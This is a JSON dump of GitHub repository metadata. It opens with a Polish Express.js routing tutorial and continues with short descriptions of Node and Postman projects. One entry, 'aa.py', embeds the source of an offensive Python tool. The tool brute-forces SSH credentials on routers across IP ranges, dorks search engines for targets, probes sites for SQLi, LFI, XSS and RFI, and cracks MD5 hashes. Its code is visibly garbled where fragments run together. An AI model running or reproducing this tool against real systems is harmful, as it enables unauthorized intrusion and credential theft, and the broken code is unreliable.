wszystko działa tak jak powinno. Testowa aplikacja, jaką stworzymy przy użyciu Expressa, będzie przedstawiała podstawową zasadę działania tego frameworka. Aplikacja uruchomi serwer oraz będzie nasłuchiwać na porcie 3000 w oczekiwaniu na połączenie - dokładnie w taki sam sposób, jak w przypadku serwera HTTP napisanego w “czystym\" Node.js. Nasłuchiwanie oznacza nic innego jak oczekiwanie na połączenie - po wystąpieniu żądania, serwer odpowie nam klasycznym “Hello world\".  Zanim zaczniemy tworzyć aplikację, musimy wytłumaczyć sobie pewne pojęcia.  Opis pojęcia routingu Routing to sposób określania jak aplikacja będzie odpowiadać na żądania klienta na dane endpointy przy użyciu konkretnych metod HTTP. Przypomnijmy sobie w jaki sposób wyglądały metody HTTP:  GET - najprostsza z metod HTTP - służy do pobierania zasobów z serwera. Pobranymi zasobami mogą być np. pliki HTML, CSS, JavaScript czy obiekty JSON / XML. POST - ta metoda jest używana do wysyłania danych do serwera. Stosuje się ją np. przy formularzach lub przy wstawianiu zdjęć i wysyłaniu ich jako załącznik. Zwykle dane te wysyłane są jako para klucz-wartość. PUT - działa podobnie jak POST, czyli również służy do wysyłania danych. Różnicą jest ograniczenie do wysłania tylko jednej porcji danych - np. jednego pola. Metoda ta najczęściej używana jest do aktualizacji istniejących danych DELETE - metoda, która służy do usuwania danych z serwera. Chodzi oczywiście o dane, które zostały wskazane przy wysyłaniu żądania. Kolejnym pojęciem jest URI (nazywane również PATH) - jest to właśnie wspomniany wcześniej endpoint, który zawiera polecenia do wykonania gdy zostanie wywołany przez żądanie.  Czas start! Na początek stwórzmy plik server.js w katalogu z projektem. Po zainstalowaniu powyższych zależności, drzewo projektu powinno wyglądać w następujący sposób:   Aby mieć możliwość skorzystania z zainstalowanych zależności, na początku należy zadeklarować zmienną, w której będziemy przechowywać funkcjonalności pakietu Expressa.  var express = require('express'); Jak widzisz, każda paczka JS'a działa dokładnie w taki sam sposób. Koncepcja modułów będzie przewijać się aż do końca tego kursu. Następnym krokiem będzie stworzenie aplikacji Express:  var app = express(); Naszą aplikację przypisaliśmy do zmiennej app. Teraz możemy sprawić, aby odpowiadała prostym Hello world w momencie, w którym odbierzemy wysłane zapytanie GET na adres strony domowej:  app.get('/', function(req, res) {     res.send('Hello world'); }); Powyższy kod rejestruje pierwszy routing (proces przetwarzania otrzymanego adresu żądania i na jego podstawie decydowanie, co powinno zostać uruchomione) na wysłane żądanie GET po wejściu na stronę główną ( http://localhost:3000/ ). Jako callback na wystąpienie tego zdarzenia wywoływana jest funkcja, która w przypadku udanej odpowiedzi wyśle wiadomość Hello world.  To jednak jeszcze nie koniec. Zarejestrowaliśmy obsługę pierwszego routingu, ale należy zainicjować nasłuchiwanie serwera na to i inne zdarzenia. Dopiszmy więc:  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Po zapisaniu powyższego kodu, należy uruchomić go komendą node server.js (lub za pomocą Nodemona, którego poznaliśmy w pierwszym module) - teraz po ponownym wejściu na adres http://localhost:3000/ powinniśmy zobaczyć następujący widok:   Jest to znak, że nasza aplikacja działa!  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.3. Route, czyli ścieżka wyznaczona dla użytkownika aplikacji Wykorzystanie endpointów Rozwińmy teraz trochę aplikację stworzoną w poprzednim podrozdziale. Aktualnie kod w pliku server.js wygląda następująco:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Endpointy statyczne Na początek zmodyfikujemy lekko żądanie GET i do strony głównej zamiast Hello world! wpiszmy Hello GET! oraz dodamy linijkę drukującą otrzymane żądanie (po stronie serwera) jak poniżej:  app.get('/', function (req, res) {     console.log('Otrzymałem żądanie GET do strony głównej');     res.send('Hello GET!'); }); Warto w tym miejscu wspomnieć o narzędziu Postman - możesz pobrać je ze strony https://www.getpostman.com/. Używa się go do testowania endpointów. Postman jest prosty i intuicyjny w obsłudze - wystarczy, że podasz adres oraz metodę HTTP, jakiej chcesz użyć w odpowiednich polach i… już :) Pozostaje tylko wysłanie requesta i sprawdzenie czy response zgadza się z naszymi oczekiwaniami.   Dodajmy też inne metody HTTP do naszej aplikacji. Zacznijmy od POST. Dla tej i kolejnej metody wykonamy podobne operacje. Chodzi tutaj o to, aby zaobserwować działanie zarejestrowanych endpointów.  app.post('/', function (req, res) {     console.log('Otrzymałem żądanie POST do strony głównej');     res.send('Hello POST!'); }); Do tego czasu oba nasze zapytania kierowaliśmy do strony domowej. Dodajmy teraz obsługę żądania z metodą DELETE oraz inną ścieżką:  app.delete('/del_user', function (req, res) {     console.log('Otrzymałem żądanie DELETE do strony /del_user');     res.send('Hello DELETE!'); }); DLA CHĘTNYCH: Przetestuj powyższe zapytanie w Postmanie! :)  Dla praktyki, dodajmy jeszcze kilka innych endpointów, a następnie przejdźmy do testowania.  app.get('/list_user', function (req, res) {     console.log('Otrzymałem żądanie GET do strony /list_user');     res.send('Strona z listą użytkowników!'); });  app.get('/ab*cd', function(req, res) {     console.log('Otrzymałem żądanie GET do strony /ab*cd');     res.send('Wzór pasuje'); }); Po dodaniu powyższych fragmentów kodu zapisz plik server.js, a następnie ponownie użyj komendy node server.js chyba, że używasz Nodemona :)  Zerknijmy na endpoint /list_user   Otrzymaliśmy to, czego oczekiwaliśmy. Sprawdźmy jeszcze inne.    Jeśli jednak użyliśmy endpointa, którego nie zdefiniowaliśmy, otrzymamy odpowiedź jak na ostatnim obrazku.  Endpointy dynamiczne Istnieje również inny typ endpointów, które nazywa się dynamicznymi. Używanie ich pozwala na przekazywanie parametrów i bazowanie na nich. Wróćmy na moment do kodu stworzonego na samym początku:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Najpierw zmodyfikujemy trochę bazowy kod. Usuńmy linijki 8-10, które miały nam tylko pokazać podstawowe informacje na temat serwera. Zamiast tego napiszmy po prostu: app.listen(3000);  Tworzenie dynamicznego routingu pozwala na przekazywanie parametrów, więc spróbujmy najpierw z przykładowym id. Zamiast odwołać się do strony domowej ('/'), odwołajmy się do zmiennego parametru id. Parametr zmienny od statycznego rozróżnia się poprzez dodanie dwukropka (:) przed nazwę. W naszym przykładzie endpoint będzie więc wyglądał następująco:  /:id Zmieńmy jeszcze odpowiedź z Hello world na 'Identyfikator, który został dopisany to ' + req.params.id.  Czym jest req.params.id? req jest obiektem reprezentującym zapytanie HTTP (ang. request). Posiada on różne parametry, jak na przykład body (czyli ciało zapytania), nagłówki HTTP oraz parametry (params), które mamy zamiar odczytać.  Parametr, który wstawiliśmy jako część adresu w metodzie GET, przekazujemy jako id. W poniższym przypadku wyświetli się komunikat Identyfikator który został dopisany to 123, o ile zapytanie wysłano na adres http://localhost:3000/123.   Popróbuj z różnymi innymi parametrami i sprawdź czy aplikacja działa tak, jak tego oczekujesz.  Obsługa błędu 404 za pomocą ExpressJS Co jeśli serwer nie rozpozna żądania? W Expressie odpowiedź 404 nie jest wynikiem błędu, więc nie jest wyłapywany w trakcie działania aplikacji. Spowodowane jest to tym, że 404 zwykle oznacza brak możliwości wykonania danej czynności, a nie błąd występujący z powodu jakiejś 'wpadki' programisty. Innymi słowy, Express wykonał wszystkie funkcje middleware (które poznamy w kolejnym rozdziale) oraz route'y i dopiero wtedy dowiedział się, że żaden z nich nie odpowiedział na żądanie - taki przypadek możemy obsłużyć poprzez dodanie funkcji middleware na samym końcu (poniżej pozostałych funkcji), aby obsługiwała status 404.  Powróćmy znów do poprzedniego szablonu z metodą GET na stronę domową ('/'), która zwraca nam Hello world!. Dopiszmy teraz metodę middleware, która obsłuży nam błąd 404.  Na samym końcu, poniżej fragmentu z nasłuchiwaniem dodajmy obsługę odpowiedzi 404:  app.use(function (req, res, next) {     res.status(404).send('Wybacz, nie mogliśmy odnaleźć tego, czego żądasz!') }); Po ponownym uruchomieniu skryptu, w przeglądarce powinieneś zobaczyć Hello world!. Spróbuj teraz dopisać coś na koniec adresu (tak jak w poprzednim rozdziale dopisaliśmy id). Powinieneś otrzymać następujący komunikat:   Parametr next, który przekazujemy do funkcji jest funkcją, która pozwala “iść dalej\" do kolejnej funkcji middleware lub zakończenia żądania.  Można w ten sposób stworzyć także obsługę pozostałych błędów. Najczęściej obsługiwane błędy to:  400 - bad request - występuje gdy serwer nie może przetworzyć zapytania 401 - unauthorized - występuje gdy wymagane jest uwierzytelnienie, a nie zostało dostarczone 403 - forbidden - żądanie jest poprawne, jednak serwer odmawia odpowiedzi, może to wystąpić w przypadku gdy np. użytkownik jest zalogowany ale nie ma uprawnień do wykonania żądania 404 - not found - zasoby nie zostały znalezione 500 - internal server error - występuje gdy występują nieznane warunki i nie ma żadnej konkretnej wiadomości Zadanie: Operacje CRUD na pliku JSON Stwórzmy teraz aplikację, która będzie otwierać zewnętrzne pliki .json oraz edytować je. Zanim zaczniemy, w folderze projektu stwórz plik server.js, a następnie zainicjalizuj projekt poprzez wpisanie npm init w konsoli.  Przejdźmy do pobrania potrzebnych zależności - tym razem będzie nam potrzebny Express oraz body-parser. Jak się zapewne domyślasz, możesz zainstalować je za pomocą komendy npm install --save express body-parser. Po pobraniu paczek, możemy śmiało przejść do pisania kodu - na początek przypisz zależności do zmiennych w pliku server.js. Dodaj także linijkę var fs = require('fs') - fs będzie nam potrzebny do operacji na plikach. Nie musimy go instalować, bo jest on wbudowany w Node :)  Skoro zależności mamy już załatwione, zadeklaruj zmienną app, która wywoła funkcję express() oraz zmienną stringifyFile (na razie bez zadeklarowanej wartości).  Tuż pod deklaracją zmiennych dodaj także linijkę app.use(bodyParser.json()); - to pozwoli Ci wykorzystać middleware body-parser, które zainstalowaliśmy przed chwilą. body-parser jest nam potrzebny, aby korzystać z formatu application/json - póki co nie przejmuj się pojęciem middleware, zajmiemy się nim nieco dalej w tym kursie :)  Stwórz teraz endpoint GET /getNote, gdzie po wywołaniu zostanie wczytany Twój zewnętrzny plik JSON oraz wyświetlona zostanie jego zawartość. Przykłądowy plik test.json:  {\"menu\": {    \"id\": \"file\",    \"value\": \"File\",    \"popup\": {      \"menuitem\": [        {\"value\": \"New\", \"onclick\": \"CreateNewDoc()\"},        {\"value\": \"Open\", \"onclick\": \"OpenDoc()\"},        {\"value\": \"Close\", \"onclick\": \"CloseDoc()\"}      ]    }  }} Metoda która pozwoli nam na odczytanie pliku to readFile, którą można wywołać z zadeklarowanego wcześniej fs. Jako parametry przyjmuje ona najpierw plik, następnie opcje (np. kodowanie) i funkcję, która wywoła się po załadowaniu. W naszym przypadku będzie to więc następujący kod: fs.readFile('./test.json', 'utf8', function(err, data) {     if (err) throw err;     stringifyFile = data     res.send(data); }); Teraz pora na stworzenie endpointa, który po wywołaniu nadpisze nam podany plik. Stworzymy do tego dynamiczny endpoint, który dopisze do pliku string, który przekażemy jako parametr. Stwórz tym razem POST na /updateNote/:note. Po jego wywołaniu tekst, który znajduje się w miejscu /:note powinniśmy dopisać do wczytanego pliku poprzez dodanie req.params.note do zmiennej stringifyFile, która przechowuje aktualną zawartość pliku.  Po przypisaniu powyższej zmiennej, należy ponownie odwołać się do modułu fs tym razem używając metody writeFile. Pomoże nam w tym następujący fragment kodu:  fs.writeFile('./test.json', stringifyFile, function(err) {     If (err) throw err;     console.log('file updated'); }); Na końcu pliku dodaj nasłuchiwanie na porcie 3000.  Zapisz plik i uruchom aplikację wpisując node server.js w konsoli.  Otwórz Postmana, ustaw metodę zapytania na GET, a w pole adresu wpisz http://localhost:3000/getNote. Jako response powinieneś otrzymać Twój stworzony wcześniej plik JSON. Po zmianie z GET na POST oraz wpisaniu /updateNote/test zamiast /getNote oraz wysłaniu requesta, Twój plik JSON powinien zostać zaktualizowany o słowo test :)  Po ukończeniu zadania, wrzuć swój kod na Githuba i przekaż link do repozytorium mentorowi :)  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_3.git   Wyslij link  17.4. Serwowanie plików statycznych Express posiada wbudowaną możliwość serwowania plików statycznych - takimi plikami są na przykład obrazki, pliki CSS czy JS. Aby serwować te pliki statycznie, wystarczy użyć express.static. Pliki statyczne to pliki, które zostają dostarczone do klienta bez generowania, modyfikacji czy przetwarzania - jedyne, co trzeba z nimi zrobić, to przekazać nazwę katalogu, w którym są przetrzymywane, do express.static - to wystarczy aby zacząć je serwować. Spróbujmy przedstawić to sobie na przykładzie.  Załóżmy, że przetrzymujesz swoje zdjęcia i pliki CSS w katalogu assets/. Aby zacząć je serwować, możesz więc użyć następującej linijki:  app.use(express.static('assets')); Zmodyfikujmy więc całkowicie naszą aplikację. Najpierw stwórzmy w katalogu projektu nowy katalog o nazwie assets/. Wrzućmy do niego jakiekolwiek zdjęcie/obrazek. W pliku server.js wróćmy do poprzedniego stanu (zanim zaczęliśmy zajmować się routingiem):  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, 'localhost', function() {     var host = server.address().address;     var port = server.address().port;      console.log('Przykładowa aplikacja nasłuchuje na http://' + host + ':' + port); }); W tym przykładzie sami definiujemy port i adres, ale w prawdziwej aplikacji moglibyśmy tych wartości nie znać. Częstym przykładem jest sytuacja w której adres i port są zdefiniowane w osobnym pliku konfiguracyjnym. Ten plik byłby inny na naszym komputerze niż na serwerze na którym będziemy publikować aplikację - ale nasz kod ma działać w obu lokalizacjach. Dlatego do wyświetlenia linka potrzebowalibyśmy pobrania tych danych za pomocą metody .address().  Pozostaje teraz jedynie w linii nr 3 dodać to, o czym powiedzieliśmy sobie chwilkę temu, czyli linijkę app.use(express.static('assets'));  Dla przypomnienia, w nawiasach do express.static przekazujemy katalog, w którym znajdują się pliki, które chcemy serwować. Po zapisaniu pliku server.js, możemy uruchomić aplikację. Teraz, aby zobaczyć nasz obrazek, wystarczy że po http://localhost:3000/ podamy nazwę pliku z rozszerzeniem - u mnie wygląda to tak:   Stwórz sobie teraz prosty plik index.html, który będzie miał formularz z dwoma inputami typu text (o nazwach first_name i last_name) oraz jednym typu submit. Element  posiada atrybuty takie jak action oraz method. Atrybut action pozwala określić, gdzie wysłać dane z formularza w momencie, gdy zostanie on zatwierdzony. W naszym przypadku będzie to http://localhost:3000/userform. Atrybut method określa metodę, jakiej chcemy użyć - w naszym przypadku niech będzie to GET.  Przykładowo, Twój index.html może wyglądać tak:                          Node Hello world example                                                 First Name:                                            Last Name:                                           Gdy już będzie gotowy, wrzuć go do katalogu /assets.  Teraz czas na modyfikację pliku server.js. Najpierw zmieńmy to, co chcemy wysyłać, gdy zostanie wysłane żądanie do strony domowej.  Zamień więc res.send('Hello world') na res.sendFile('/index.html') - jak się zapewne domyślasz, res.sendFile() wysyła w odpowiedzi plik zamiast wiadomości.  Musimy również dodać obsługę żądania na endpoint, do którego będziemy kierować nasz formularz.  app.get('/userform', function (req, res) {     const response = {         first_name: req.query.first_name,         last_name: req.query.last_name     };     res.end(JSON.stringify(response)); }); W czasie przetwarzania żądania, tworzymy nowy obiekt response, który ma klucze first_name oraz last_name. Do poszczególnych właściwości przypisujemy dane, które otrzymujemy w obiekcie req (od ang. request), czyli w obiekcie z żądaniem. Na koniec wyświetlamy nasz obiekt przetworzony na typ string za pomocą metody JSON.stringify. Po zapisaniu pliku server.js, aplikacja powinna pokazywać formularz, jak poniżej.   Po wpisaniu wartości do inputów i wysłaniu ich, powinieneś zostać przekierowany do strony /userform, a po znaku zapytania powinny zostać wyświetlone parametry umieszczone przez Ciebie w inputach.   Zadanie: Żonglujemy danymi pomiędzy endpointami Napisz kod obsługujący formularz zgodnie z wskazówkami z tego submodułu, a następnie wyślij swój kod na repozytorium oraz przekaż go do sprawdzenia mentorowi.  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_4.git   Wyslij link 17.5. Middleware - pośrednik między żądaniem a odpowiedzią",
    "fork": false,
    "created_at": "2018-01-26T19:03:05Z",
    "updated_at": "2018-01-26T19:03:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13038633,
    "owner_login": "martinproxy0",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/13038633?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "data",
      "request",
      "form",
      "file",
      "application",
      "server",
      "call",
      "node",
      "json",
      "http",
      "user",
      "develop",
      "express",
      "auto",
      "example",
      "automat",
      "implement",
      "format",
      " express",
      "auth",
      "endpoint",
      "framework",
      "route",
      "https",
      "function",
      "demo",
      "send",
      "local",
      "list",
      "star",
      "source",
      "read",
      "front",
      "update",
      "response",
      "stat",
      "host",
      "start",
      "delete",
      "face",
      "package",
      "method",
      "info",
      "developer",
      "system",
      "name",
      "html",
      "action",
      "module",
      "program",
      "infor",
      "github",
      "model",
      "tech",
      "esse",
      "text",
      "getpost",
      "problem",
      "install",
      "parse",
      "link",
      "proxy",
      "folder",
      "status",
      "require",
      "middleware",
      "parser",
      "console",
      "intern",
      "note",
      "popular",
      "party",
      "write",
      "query",
      "sets",
      "updated",
      "dynamic",
      "modules",
      "routing",
      "role",
      "world",
      "address",
      "dependencies",
      "found",
      "error",
      "internal",
      "listen",
      "jest",
      "kurs",
      "rake",
      "ekspresowe",
      "kazan",
      "wars"
    ]
  },
  {
    "id": 17645181,
    "name": "aa.py",
    "full_name": "udinparla/aa.py",
    "description": "#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()",
    "fork": false,
    "created_at": "2014-03-11T20:35:08Z",
    "updated_at": "2019-11-23T18:43:58Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 0,
    "watchers": 4,
    "score": 1,
    "owner_id": 6923150,
    "owner_login": "udinparla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6923150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "file",
      "call",
      "http",
      "user",
      "auto",
      "automat",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "send",
      "list",
      "site",
      "star",
      "source",
      "read",
      "import",
      "running",
      "response",
      "host",
      "start",
      "python",
      "connect",
      "need",
      "shop",
      "name",
      "html",
      "task",
      "search",
      "open",
      "print",
      "result",
      "main",
      "class",
      "automatic",
      "link",
      "header",
      "results",
      "creation",
      "done",
      "find",
      "given",
      "automatically",
      "many",
      "write",
      "location",
      "free",
      "router",
      "output",
      "gets",
      "sends",
      "correct",
      "while",
      "address",
      "pages",
      "found",
      "admin",
      "reading",
      "google",
      "random",
      "seek",
      "crawler",
      "grab"
    ]
  },
  {
    "id": 211283078,
    "name": "postman-export-formatter",
    "full_name": "john-lock/postman-export-formatter",
    "description": "A formatter for Postman Collection exports for file uploads. Allowing users to put the desired path in the description and have this path writtening into the file upload path - rather than having the default relative paths given by PM",
    "fork": false,
    "created_at": "2019-09-27T09:22:43Z",
    "updated_at": "2020-03-13T11:24:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 36238895,
    "owner_login": "john-lock",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/36238895?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "file",
      "script",
      "user",
      "format",
      "load",
      "export",
      "users",
      "written",
      "desc",
      "upload",
      "given",
      "default",
      "description",
      "exports",
      "path",
      "having",
      "formatter"
    ]
  },
  {
    "id": 118093070,
    "name": "MEAN",
    "full_name": "judedaryl/MEAN",
    "description": "Creating a mean stack for user login and registration",
    "fork": false,
    "created_at": "2018-01-19T07:35:13Z",
    "updated_at": "2018-01-24T15:45:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13645031,
    "owner_login": "judedaryl",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13645031?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "stack",
      "login",
      "mean",
      "registration"
    ]
  },
  {
    "id": 184118378,
    "name": "command-line-physician",
    "full_name": "command-line-physician/command-line-physician",
    "description": "Our intention with this app is to let users find natural herbal based remedies for their ailments. Our app allows users to browse our specially curated herb database by name and latin name. Command-Line Physician also allows users to locate the nearest store where they can find their unique remedy, or a local resident who has the herb available to share. Tech stack: Command-line Physician is a RESTful api that utilizes Node, Express, Jest, end-to-end and unit testing. Our testing was carried out by Compass, Robo 3T, and Postman.",
    "fork": false,
    "created_at": "2019-04-29T17:57:06Z",
    "updated_at": "2019-05-29T23:32:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 4,
    "watchers": 0,
    "score": 1,
    "owner_id": 50116559,
    "owner_login": "command-line-physician",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/50116559?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "testing",
      "rest",
      "database",
      "user",
      "based",
      "line",
      "util",
      "spec",
      "local",
      "users",
      "store",
      "name",
      "side",
      "allows",
      "stack",
      "unit",
      "available",
      "find",
      "utilizes",
      "intention"
    ]
  },
  {
    "id": 227783010,
    "name": "task-manager-api",
    "full_name": "Shaykoo/task-manager-api",
    "description": "This app is purely based on NodeJS. This app is a task manager app which stores all the users and their tasks in MongoDB database with required authentication of the user to create, read, update and delete the users and their own particular tasks plus when a user gets created or deleted the app sends them email to notify. Use the website address to test it on postman. Get authenticated before using the app on postman.",
    "fork": false,
    "created_at": "2019-12-13T07:35:57Z",
    "updated_at": "2020-01-13T15:06:20Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 34743587,
    "owner_login": "Shaykoo",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/34743587?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "data",
      "database",
      "user",
      "based",
      "mail",
      "auth",
      "manage",
      "send",
      "site",
      "read",
      "authentication",
      "users",
      "update",
      "delete",
      "email",
      "website",
      "store",
      "task",
      "require",
      "tasks",
      "authenticate",
      "gets",
      "sends",
      "required",
      "pure",
      "address",
      "authenticated",
      "manager",
      "notify",
      "purely"
    ]
  },
  {
    "id": 87771466,
    "name": "Mean-Hotel",
    "full_name": "regeanish/Mean-Hotel",
    "description": "Created a Hotel API where user can add, delete, update hotel name and reviews using NodeJS(Express) and MongoDB. Used RESTful API HTTP client POSTMAN for testing.  Additionally,  building UI for displaying information coming from the server & database about the hotel using AngularJS",
    "fork": false,
    "created_at": "2017-04-10T05:50:10Z",
    "updated_at": "2017-08-21T03:13:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17118506,
    "owner_login": "regeanish",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/17118506?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "testing",
      "form",
      "server",
      "client",
      "database",
      "user",
      "format",
      "build",
      "update",
      "view",
      "delete",
      "info",
      "play",
      "name",
      "infor",
      "information",
      "building",
      "review",
      "display",
      "playing",
      "reviews",
      "hotel"
    ]
  },
  {
    "id": 201312005,
    "name": "food-delivery-server-goit",
    "full_name": "SerhiiY/food-delivery-server-goit",
    "description": "A course task with using node.js server. All queries were tested by Postman. App can give products list or user by id and write a new product or user to the database. On master branch used http module, on express-hw branch express.js is used.",
    "fork": false,
    "created_at": "2019-08-08T18:06:53Z",
    "updated_at": "2019-09-10T10:36:12Z",
